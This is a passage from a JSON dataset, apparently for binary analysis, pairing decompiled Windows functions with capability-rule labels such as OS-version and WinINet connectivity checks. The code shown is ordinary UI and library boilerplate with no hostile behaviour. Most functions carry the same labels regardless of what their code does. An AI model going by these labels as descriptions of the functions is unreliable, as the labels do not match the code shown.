        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.00430847(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t extraout_ECX;\n    int32_t *piVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_8h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    arg_8h_00 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = &stack0xffffffec;\n    if (arg_8h_00 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.00427dff(arg_8h_00);\n        if (iVar1 == 0) {\n            iVar1 = fcn.00427dff(arg_8h_00);\n            if (iVar1 == 0) {\n                uVar2 = fcn.0042eaa9(0x434cb4);\n                *(unaff_EBP + -4) = 0;\n                *(unaff_EBP + 8) = uVar2;\n                iVar1 = fcn.0040f60b();\n                if (iVar1 == 0) {\n                    fcn.00422e2d();\n                }\n                (**(extraout_ECX + 0x14))(iVar1);\n                piVar3 = fcn.00427f9e(arg_8h_00);\n                uVar2 = *(unaff_EBP + 8);\n                *(unaff_EBP + -4) = 0xffffffff;\n                *piVar3 = iVar1;\n                fcn.0042eaa9(uVar2);\n                piVar3 = *(extraout_ECX + 0x58) + iVar1;\n                *piVar3 = arg_8h_00;\n                if (*(extraout_ECX + 0x5c) == 2) {\n                    piVar3[1] = arg_8h_00;\n                }\n            }\n            else {\n                piVar3 = *(extraout_ECX + 0x58) + iVar1;\n                *piVar3 = arg_8h_00;\n                if (*(extraout_ECX + 0x5c) == 2) {\n                    piVar3[1] = arg_8h_00;\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar1;\n}\n",
        "token_count": 615
    },
    "00426440": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00426440(code **param_1)\n\n{\n    uint uVar1;\n    \n    *param_1 = vtable.CImageList.0;\n    if (param_1[1] == NULL) {\n        return 0;\n    }\n    uVar1 = fcn.00426175();\n    uVar1 = (*_sym.imp.COMCTL32.dll_ImageList_Destroy)(uVar1);\n    return uVar1;\n}\n",
        "token_count": 98
    },
    "00426e09": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool fcn.00426e09(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.004461ac(0x426d76);\n    if (*(iVar1 + 0x24) == 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"RICHED20.DLL\");\n        *(iVar1 + 0x24) = uVar2;\n    }\n    return *(iVar1 + 0x24) != 0;\n}\n",
        "token_count": 116
    },
    "00427069": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427069(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint unaff_ESI;\n    uint uStack8;\n    \n    if (*(param_1 + 0x10) == 0) {\n        uStack8 = 0xc;\n        iVar1 = fcn.00427220(param_1 + 0x14, *(param_1 + 0x18));\n        iVar3 = *(param_1 + 0x18);\n        puVar2 = iVar1 + -8 + iVar3 * 0xc;\n        if (-1 < iVar3 + -1) {\n            do {\n                *puVar2 = *(param_1 + 0x10);\n                *(param_1 + 0x10) = puVar2;\n                puVar2 = puVar2 + -3;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    puVar2 = *(param_1 + 0x10);\n    *(param_1 + 0x10) = *puVar2;\n    puVar2[1] = uStack8;\n    *puVar2 = unaff_ESI;\n    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n    puVar2[2] = 0;\n    return;\n}\n",
        "token_count": 317
    },
    "00427112": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427112(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = arg_8h;\n    if (arg_8h == 0) {\n        fcn.00422e61();\n    }\n    arg_8h = *(iVar1 + 8);\n    while (arg_8h != 0) {\n        fcn.0040b90b(&arg_8h);\n        fcn.004270bf();\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "0042714f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042714f(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = arg_8h;\n    if (arg_8h == 0) {\n        fcn.00422e61();\n    }\n    arg_8h = *(iVar1 + 4);\n    while (arg_8h != 0) {\n        fcn.0040ab3a(&arg_8h);\n        fcn.004270e9();\n    }\n    return;\n}\n",
        "token_count": 115
    },
    "00427220": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00427220(uint *param_1, int32_t param_2, int32_t param_3)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    \n    if ((param_2 != 0) && (param_3 != 0)) {\n        puVar2 = fcn.0042eabb(param_2 * param_3 + 4);\n        *puVar2 = *param_1;\n        *param_1 = puVar2;\n        return;\n    }\n    fcn.00422e61();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 142
    },
    "00427d37": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00427d37(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint uVar1;\n    \n    if (param_2 == 0) {\n        param_2 = 0x11;\n    }\n    if (*(param_1 + 4) != 0) {\n        fcn.0042eae6(*(param_1 + 4));\n        *(param_1 + 4) = 0;\n    }\n    if (param_3 != 0) {\n        uVar1 = fcn.0042eabb(param_2 << 2);\n        *(param_1 + 4) = uVar1;\n        fcn.00411850(uVar1, 0, param_2 << 2);\n    }\n    *(param_1 + 8) = param_2;\n    return;\n}\n",
        "token_count": 196
    },
    "00427f53": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427f53(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    \n    if (*(param_1 + 0x10) == 0) {\n        iVar2 = fcn.00427220(param_1 + 0x14, *(param_1 + 0x18), 0xc);\n        iVar4 = *(param_1 + 0x18);\n        puVar3 = iVar2 + -8 + iVar4 * 0xc;\n        if (-1 < iVar4 + -1) {\n            do {\n                *puVar3 = *(param_1 + 0x10);\n                *(param_1 + 0x10) = puVar3;\n                puVar3 = puVar3 + -3;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n    }\n    puVar3 = *(param_1 + 0x10);\n    uVar1 = *puVar3;\n    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n    *(param_1 + 0x10) = uVar1;\n    puVar3[1] = 0;\n    puVar3[2] = 0;\n    return;\n}\n",
        "token_count": 303
    },
    "00428030": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00428030(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint uVar1;\n    \n    if (param_2 == 0) {\n        param_2 = 0x11;\n    }\n    if (*(param_1 + 4) != 0) {\n        fcn.0042eae6(*(param_1 + 4));\n        *(param_1 + 4) = 0;\n    }\n    if (param_3 != 0) {\n        uVar1 = fcn.0042eabb(param_2 << 2);\n        *(param_1 + 4) = uVar1;\n        fcn.00411850(uVar1, 0, param_2 << 2);\n    }\n    *(param_1 + 8) = param_2;\n    return;\n}\n",
        "token_count": 195
    },
    "004280c6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.004280c6(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    \n    if (*(param_1 + 0x10) == 0) {\n        iVar2 = fcn.00427220(param_1 + 0x14, *(param_1 + 0x18), 0x10);\n        iVar4 = *(param_1 + 0x18);\n        puVar3 = iVar2 + -0xc + iVar4 * 0x10;\n        if (-1 < iVar4 + -1) {\n            do {\n                *puVar3 = *(param_1 + 0x10);\n                *(param_1 + 0x10) = puVar3;\n                puVar3 = puVar3 + -4;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n    }\n    puVar3 = *(param_1 + 0x10);\n    uVar1 = *puVar3;\n    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n    *(param_1 + 0x10) = uVar1;\n    if (puVar3 != 0xfffffff8) {\n        fcn.00402490();\n    }\n    puVar3[3] = 0;\n    return puVar3;\n}\n",
        "token_count": 323
    },
    "00428bc5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: hResData\n// WARNING: Variable defined which should be unmapped: hWnd\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nint32_t fcn.00428bc5(uint param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t noname_0;\n    uint noname_1;\n    uint32_t uVar3;\n    int32_t *extraout_ECX;\n    uint unaff_EBX;\n    int32_t unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    uint var_10h;\n    int32_t *noname_4;\n    uint var_20h;\n    uint var_1ch;\n    uint hResData;\n    uint hWnd;\n    uint in_stack_ffffffec;\n    uint var_ch;\n    uint in_stack_fffffff4;\n    uint var_4h;\n    uint noname_13;\n    \n    noname_13 = 0x428bcf;\n    fcn.004118b0();\n    iVar1 = extraout_ECX[0x16];\n    noname_0 = extraout_ECX[0x17];\n    *(unaff_EBP + -0x10) = &fcn.00428bc5::var_20h;\n    *(unaff_EBP + -0x1c) = extraout_ECX;\n    *(unaff_EBP + -0x18) = iVar1;\n    var_20h = unaff_EDI;\n    var_1ch = unaff_ESI;\n    hResData = unaff_EBX;\n    iVar1 = fcn.00444bf8();\n    uVar4 = *(iVar1 + 0xc);\n    if (extraout_ECX[0x15] != 0) {\n        iVar1 = fcn.00444bf8();\n        uVar4 = *(iVar1 + 0xc);\n        uVar2 = (*_sym.imp.KERNEL32.dll_FindResourceA)(uVar4, extraout_ECX[0x15], 5);\n        uVar2 = (*_sym.imp.KERNEL32.dll_LoadResource)(uVar4, uVar2);\n        *(unaff_EBP + -0x18) = uVar2;\n    }\n    if (*(unaff_EBP + -0x18) != 0) {\n        noname_0 = (*_sym.imp.KERNEL32.dll_LockResource)(*(unaff_EBP + -0x18));\n    }\n    if (noname_0 == 0) {\n        iVar1 = -1;\n    }\n    else {\n        uVar2 = fcn.00428705();\n        *(unaff_EBP + -0x14) = uVar2;\n        fcn.0042b4da();\n        *(unaff_EBP + -0x20) = 0;\n        if (*(unaff_EBP + -0x14) != 0) {\n            iVar1 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n            if (*(unaff_EBP + -0x14) != iVar1) {\n                iVar1 = (*_sym.imp.USER32.dll_IsWindowEnabled)(*(unaff_EBP + -0x14));\n                if (iVar1 != 0) {\n                    (*_sym.imp.USER32.dll_EnableWindow)(*(unaff_EBP + -0x14), 0);\n                    *(unaff_EBP + -0x20) = 1;\n                }\n            }\n        }\n        *(unaff_EBP + -4) = 0;\n        noname_4 = extraout_ECX;\n        fcn.0042cef4();\n        uVar2 = *(unaff_EBP + -0x14);\n        noname_1 = fcn.0042b432();\n        iVar1 = fcn.004289b8(noname_0, noname_1, uVar4, uVar2, noname_4, var_20h, var_1ch, hResData, hWnd, \n                             in_stack_ffffffec, var_ch, in_stack_fffffff4, var_4h, noname_13, unaff_retaddr, param_1, \n                             param_2, param_3, var_10h, param_5, param_6);\n        if (iVar1 != 0) {\n            if ((*(extraout_ECX + 0xe) & 0x10) != 0) {\n                uVar4 = 4;\n                uVar3 = fcn.0042dd19();\n                if ((uVar3 & 0x100) != 0) {\n                    uVar4 = 5;\n                }\n                fcn.0042aed6(uVar4);\n            }\n            if (extraout_ECX[7] != 0) {\n                fcn.0042e037(0, 0, 0, 0, 0, 0x97);\n            }\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*(unaff_EBP + -0x20) != 0) {\n            (*_sym.imp.USER32.dll_EnableWindow)(*(unaff_EBP + -0x14), 1);\n        }\n        if (*(unaff_EBP + -0x14) != 0) {\n            iVar1 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n            if (iVar1 == extraout_ECX[7]) {\n                (*_sym.imp.USER32.dll_SetActiveWindow)(*(unaff_EBP + -0x14));\n            }\n        }\n        (**(*extraout_ECX + 0x60))();\n        fcn.0042873f();\n        if (extraout_ECX[0x15] != 0) {\n            (*_sym.imp.KERNEL32.dll_FreeResource)(*(unaff_EBP + -0x18));\n        }\n        iVar1 = extraout_ECX[0x10];\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar1;\n}\n",
        "token_count": 1422
    },
    "00429033": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00429033(uint arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (arg_ch == 0) {\n        uVar1 = 0;\n    }\n    else {\n        if (arg_10h != 0) {\n            do {\n                arg_10h = arg_10h + -1;\n                arg_ch = fcn.00411e20(arg_ch, arg_14h);\n                if (arg_ch == 0) {\n                    fcn.00401810();\n                    return 0;\n                }\n                arg_ch = arg_ch + 1;\n            } while (arg_10h != 0);\n        }\n        iVar2 = fcn.00411e20(arg_ch, arg_14h);\n        if (iVar2 == 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(arg_ch);\n        }\n        else {\n            iVar2 = iVar2 - arg_ch;\n        }\n        uVar1 = fcn.0040a932(iVar2, arg_ch, iVar2);\n        fcn.00411970(uVar1, iVar2, arg_ch);\n        fcn.004059a0(0xffffffff);\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 304
    },
    "00429448": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00429448(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *param_1;\n    if (param_2 < *(iVar1 + -0xc)) {\n        param_2 = *(iVar1 + -0xc);\n    }\n    if (*(iVar1 + -4) < 2) {\n        iVar1 = *(iVar1 + -8);\n        if (iVar1 < param_2) {\n            if (iVar1 < 0x401) {\n                iVar1 = iVar1 * 2;\n            }\n            else {\n                iVar1 = iVar1 + 0x400;\n            }\n            if (iVar1 < param_2) {\n                iVar1 = param_2;\n            }\n            fcn.004293ee(iVar1);\n        }\n    }\n    else {\n        fcn.00429387(param_2);\n    }\n    return;\n}\n",
        "token_count": 208
    },
    "004294be": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004294be(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    uint32_t uVar3;\n    \n    if (arg_ch == 0) {\n        fcn.0042933e();\n    }\n    else {\n        if (arg_8h == 0) {\n            fcn.00401100(0x80070057);\n        }\n        uVar1 = *(*in_ECX + -0xc);\n        uVar3 = arg_8h - *in_ECX >> 1;\n        iVar2 = fcn.0042948f(arg_ch);\n        if (uVar1 < uVar3) {\n            fcn.00429189(iVar2, arg_8h, arg_ch);\n        }\n        else {\n            fcn.004291a1(iVar2, iVar2 + uVar3 * 2);\n        }\n        fcn.00429263(arg_ch);\n    }\n    return;\n}\n",
        "token_count": 232
    },
    "00429a6d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpWndClass\n\nuint __cdecl\nfcn.00429a6d(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint arg_8h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint lpWndClass;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    iVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = &lpWndClass;\n    iVar4 = (*_sym.imp.USER32.dll_GetClassInfoA)(*(iVar1 + 0x10), *(iVar1 + 0x24), unaff_EBP + -0x40);\n    if (iVar4 != 0) {\n        uVar5 = 1;\n        goto code_r0x00429b4d;\n    }\n    iVar3 = (*_sym.imp.USER32.dll_RegisterClassA)(iVar1);\n    if (iVar3 == 0) {\ncode_r0x00429af2:\n        uVar5 = 0;\n    }\n    else {\n        *(unaff_EBP + -0x18) = 1;\n        iVar4 = fcn.00444bf8();\n        if (*(iVar4 + 0x14) != '\\0') {\n            fcn.0044673a(1);\n            *(unaff_EBP + -4) = 0;\n            iVar4 = fcn.00444bf8();\n            pcVar2 = _sym.imp.KERNEL32.dll_lstrlenA;\n            *(unaff_EBP + -0x14) = iVar4 + 0x34;\n            iVar4 = (*pcVar2)(iVar4 + 0x34);\n            iVar6 = (*pcVar2)(*(iVar1 + 0x24));\n            if (0xfff < iVar4 + 2 + iVar6) goto code_r0x00429af2;\n            uVar7 = (*pcVar2)(*(unaff_EBP + -0x14));\n            uVar5 = *(iVar1 + 0x24);\n            *(unaff_EBP + 8) = uVar7;\n            iVar4 = (*pcVar2)(uVar5);\n            pcVar2 = _sym.imp.KERNEL32.dll_lstrcatA;\n            if (*(unaff_EBP + 8) + 2 + iVar4 < 0x1000) {\n                (*_sym.imp.KERNEL32.dll_lstrcatA)(*(unaff_EBP + -0x14), *(iVar1 + 0x24));\n                *(unaff_EBP + 10) = 10;\n                *(unaff_EBP + 0xb) = 0;\n                (*pcVar2)(*(unaff_EBP + -0x14), unaff_EBP + 10);\n            }\n            else {\n                uVar5 = *(iVar1 + 0x10);\n                *(unaff_EBP + -0x18) = 0;\n                (*_sym.imp.USER32.dll_UnregisterClassA)(*(iVar1 + 0x24), uVar5);\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.0044679d(1);\n        }\n        uVar5 = *(unaff_EBP + -0x18);\n    }\ncode_r0x00429b4d:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar5;\n}\n",
        "token_count": 929
    },
    "00429ba5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00429ba5(int32_t *arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    while( true ) {\n        if (arg_8h[4] == 0) {\n            return NULL;\n        }\n        if ((((arg_ch == *arg_8h) && (arg_10h == arg_8h[1])) && (arg_8h[2] <= arg_14h)) &&\n           (arg_14h < arg_8h[3] || arg_14h == arg_8h[3])) break;\n        arg_8h = arg_8h + 6;\n    }\n    return arg_8h;\n}\n",
        "token_count": 168
    },
    "00429cb3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00429cb3(int32_t *param_1, int32_t param_2, uint *param_3, uint param_4)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = param_1[7];\n    if (param_2 != 2) {\n        iVar1 = (**(*param_1 + 0x70))(param_2);\n        if (iVar1 != 0) {\n            iVar2 = *(iVar1 + 0x1c);\n            param_2 = 2;\n        }\n    }\n    *param_3 = 0x1c;\n    param_3[1] = param_4;\n    (*_sym.imp.USER32.dll_GetScrollInfo)(iVar2, param_2, param_3);\n    return;\n}\n",
        "token_count": 181
    },
    "00429cf0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00429cf0(int32_t *arg_8h, uint hWnd, int32_t *lprc2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint lpRect;\n    uint var_8h;\n    \n    uVar2 = (*_sym.imp.USER32.dll_GetParent)(hWnd);\n    if ((arg_8h == NULL) || (*arg_8h != 0)) {\n        (*_sym.imp.USER32.dll_GetWindowRect)(hWnd, &lpRect);\n        pcVar1 = _sym.imp.USER32.dll_ScreenToClient;\n        (*_sym.imp.USER32.dll_ScreenToClient)(uVar2, &lpRect);\n        (*pcVar1)(uVar2, &var_8h);\n        iVar3 = (*_sym.imp.USER32.dll_EqualRect)(&lpRect, lprc2);\n        if (iVar3 == 0) {\n            if (arg_8h == NULL) {\n                (*_sym.imp.USER32.dll_SetWindowPos)\n                          (hWnd, 0, *lprc2, lprc2[1], lprc2[2] - *lprc2, lprc2[3] - lprc2[1], 0x14);\n            }\n            else {\n                iVar3 = (*_sym.imp.USER32.dll_DeferWindowPos)(*arg_8h);\n                *arg_8h = iVar3;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 335
    },
    "00429d7c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00429d7c(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    \n    uVar1 = fcn.0042dd33();\n    if (param_2 == 0) {\n        uVar1 = uVar1 & 0xfffffdff;\n    }\n    uVar2 = fcn.0042dd19(0, uVar1);\n    (*_sym.imp.USER32.dll_AdjustWindowRectEx)(param_1, uVar2);\n    return;\n}\n",
        "token_count": 123
    },
    "0042a442": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042a442(int32_t hdc, uint arg_ch, int32_t arg_10h, int32_t hgdiobj, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint lpvObject;\n    uint crColor;\n    \n    if ((((hdc == 0) || (hgdiobj == 0)) || (arg_10h == 1)) || ((arg_10h == 0 || (arg_10h == 5)))) {\ncode_r0x0042a4b1:\n        uVar2 = 0;\n    }\n    else {\n        if (arg_10h == 2) {\n            iVar1 = fcn.00434af7(arg_ch, 2);\n            if (iVar1 == 0) goto code_r0x0042a4b1;\n        }\n        (*_sym.imp.GDI32.dll_GetObjectA)(hgdiobj, 0xc, &lpvObject);\n        (*_sym.imp.GDI32.dll_SetBkColor)(hdc, crColor);\n        if (arg_18h == -1) {\n            arg_18h = (*_sym.imp.USER32.dll_GetSysColor)(8);\n        }\n        (*_sym.imp.GDI32.dll_SetTextColor)(hdc, arg_18h);\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 309
    },
    "0042a6c6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0042a6c6(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    \n    iVar4 = fcn.00444c1e();\n    if ((*(iVar4 + 0x3c) != 0) && (iVar1 = *(*(iVar4 + 0x3c) + 0x1c),  iVar1 != 0)) {\n        (*_sym.imp.USER32.dll_SendMessageA)(iVar1, 0x401, 0, 0);\n    }\n    piVar2 = *(iVar4 + 0x7c);\n    if ((param_1 != 0) && (piVar2 != NULL)) {\n        iVar3 = (*_sym.imp.USER32.dll_GetKeyState)(1);\n        if (-1 < iVar3) {\n            (**(*piVar2 + 0x160))(0xffffffff);\n        }\n    }\n    return;\n}\n",
        "token_count": 222
    },
    "0042aa94": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
